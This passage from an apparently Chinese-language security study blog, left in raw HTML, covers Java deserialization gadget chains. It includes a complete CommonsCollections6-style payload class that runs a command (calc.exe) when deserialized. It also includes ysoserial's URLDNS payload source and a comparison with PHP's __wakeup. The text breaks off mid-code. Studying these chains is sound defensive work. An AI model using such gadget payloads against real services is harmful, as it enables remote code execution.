class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>LazyMap.decorate(innerMap,transformerChain);<br></code></pre></td></tr></table></figure><p>上述代码，为了避免本地调试时触发命令执⾏，我构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformers 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。现在，我拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着，为了调⽤ TiedMapEntry#hashCode() ，我们需要将 tme 对象作为 HashMap 的⼀个key。注意，这⾥我们需要新建⼀个HashMap，⽽不是⽤之前LazyMap利⽤链⾥的那个HashMap，两者没任何关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><span class="hljs-comment">//如果键值为 null，则使用 0 作为键值的哈希码；否则使用键值本身的哈希码；</span><br><span class="hljs-comment">//如果值为 null，则使用 0 作为值的哈希码；否则使用值本身的哈希码；</span><br><span class="hljs-comment">//对上述两个哈希码进行位异或运算，得到最终的哈希值。</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后，我就可以将这个 expMap 作为对象来序列化了，不过，别忘了将真正的 transformers 数组设置进来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 将真正的transformers数组设置进来</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// ⽣成序列化字符串</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(expMap);<br>oos.close();<br></code></pre></td></tr></table></figure><p>于是我们的利用链成了这个样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections6_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class,<br>                Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                Object.class,<br>                Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class<br>            &#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span><br>            ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是什么也没有发生</p><h3 id="为何无法利用"><a href="#为何无法利用" class="headerlink" title="为何无法利用"></a>为何无法利用</h3><p>我们来反思⼀下，为什么我们构造的Gadget没有成功执⾏命令？</p><p>单步调试⼀下，你会发现关键点在LazyMap的get⽅法，下图我画框的部分，就是最后触发命令执⾏的transform() ，但是这个if语句并没有进⼊，因为 map.containsKey(key) 的结果是true：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191227554.png" alt="image-20230214213215733"> </p><p>这里要看是True还是False的话需要加一个监视，右键选中变量即可</p><p>但是很奇怪，无论<code>outerMap.remove(&quot;keykey&quot;)</code> 这一行是否存在，map**.**ContainKey始终等于False，始终能进入循环</p><p>这里感觉p说的有点矛盾，</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224564.png" alt="image-20230214214954404"> </p><p>里面已经放入了key，但是</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191225526.png" alt="image-20230214215019248"> 却说自己放了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/Decemberus.github-io/2022/11/02/URLDNS/"/>
    <url>/Decemberus.github-io/2022/11/02/URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化之URLDNS"><a href="#Java反序列化之URLDNS" class="headerlink" title="Java反序列化之URLDNS"></a>Java反序列化之URLDNS</h1><h2 id="反序列化方法比较"><a href="#反序列化方法比较" class="headerlink" title="反序列化方法比较"></a>反序列化方法比较</h2><p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</p><p>但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p><p>当然，PHP中也提供了一个魔术方法叫 <code>__wakeup</code> ，在反序列化的时候进行触发。很多人会认为Java的readObject 和PHP的 <code>__wakeup</code> 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决</p><p>的问题稍微有些差异。</p><p>Java设计 readObject 的思路和PHP的 <code>__wakeup</code> 不同点在于： readObject 倾向于解决“<strong>反序列化时如何还原一个完整对象”</strong>这个问题，而PHP的 <code>__wakeup</code> 更倾向于解决“<strong>反序列化后如何初始化这个对象</strong>”的问题。</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 <code>__sleep</code> 、<code>__wakeup</code> 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序列化后就是null，反序列化时拿到的也是null。</p><p>那么，如果我想要反序列化时拿到的 <code>$link</code> 就是一个数据库连接，我就需要编写 <code>__wakeup</code> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dsn&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到Connection对象后，执行 connect() 函数，连接数据库。</p><p><code>__wakeup</code> 的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。</p><p>所以你会发现，PHP的反序列化漏洞，很少是由 <code>__wakeup</code> 这个方法触发的，通常触发在析构函数</p><p><code>__destruct</code> 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作</p><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 <code>__wakeup</code> 、 <code>__sleep</code> 很少使用是存在鲜明对比的。</p><p>这次再来说说objectAnnotation 。</p><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>举个例子，我编写了一个Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    Person(String name, <span class="hljs-type">int</span> age) &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span><br>            IOException &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is a object&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，我这里在执行完默认的 s.defaultWriteObject() 后，我向stream里写入了一个字符串 Thisis a object 。我们用上一章讲的工具SerializationDumper查看此时生成的序列化数据：</p><p><img src="D:\mdimage\image-20221231155054925.png" alt="image-20221231155054925"> </p><p><img src="D:\mdimage\image-20221231155102223.png" alt="image-20221231155102223"> </p><p>可见，我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p><p>在反序列化时，我读取了这个字符串，并将其输出：</p><p><img src="D:\mdimage\image-20221231155130319.png" alt="image-20221231155130319"> </p><p>这个特性就让Java的开发变得非常灵活。比如后面将会讲到的HashMap，其就是将Map中的所有键、</p><p>值都存储在 objectAnnotation 中，而并不是某个具体属性里。</p><p>关于一些具体类是如何使用 readObject 方法的，我们后面在说到gadget的时候会详细分析。</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤：</p><ul><li>使⽤Java内置的类构造，对第三⽅库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><p>以下为ysoerial的源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>    <span class="hljs-comment">//Since the field 